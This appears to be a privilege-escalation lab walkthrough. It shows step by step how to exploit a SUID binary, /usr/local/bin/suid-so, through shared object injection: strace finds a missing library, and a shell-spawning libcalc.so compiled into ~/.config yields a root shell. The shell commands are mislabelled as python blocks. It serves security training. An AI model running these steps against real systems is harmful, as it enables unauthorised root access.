The **/usr/local/bin/suid-so** SUID executable is vulnerable to shared object injection.

**First, execute the file and note that currently it displays a progress bar before exiting:**
```python
/usr/local/bin/suid-so
```

**Run "strace" on the file and search the output for open/access calls and for "no such file" errors:**
```python
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

**Create the ".config" directory for the libcalc.so file:**
```python
mkdir /home/user/.config
```
Example shared object code can be found at **/home/user/tools/suid/libcalc.c**. It simply spawns a Bash shell.

**Compile the code into a shared object at the location the "suid-so" executable was looking for it:**
```python
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

**Execute the "suid-so" executable again, and note that this time, instead of a progress bar, we get a root shell.**
```python
/usr/local/bin/suid-so
```
